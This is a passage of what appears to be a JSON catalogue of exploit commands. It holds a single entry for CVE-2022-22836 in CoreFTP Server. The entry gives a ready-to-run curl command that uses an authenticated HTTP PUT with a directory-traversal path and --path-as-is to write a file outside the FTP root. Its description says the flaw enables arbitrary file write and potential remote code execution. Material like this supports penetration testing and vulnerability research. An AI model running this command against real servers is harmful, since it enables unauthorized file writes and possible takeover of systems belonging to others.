      "id": "coreftp-path-traversal",
      "name": "CoreFTP - Path Traversal File Write (CVE-2022-22836)",
      "command": "curl -k -X PUT -H \"Host: <ip>\" --basic -u <user>:<password> --data-binary \"PoC.\" --path-as-is https://<ip>/../../../../../../whoops",
      "description": "Exploits CVE-2022-22836 in CoreFTP Server: an authenticated HTTP PUT with a traversal path (--path-as-is) writes a file outside the FTP root anywhere the service can reach, enabling arbitrary file write and potential RCE.",
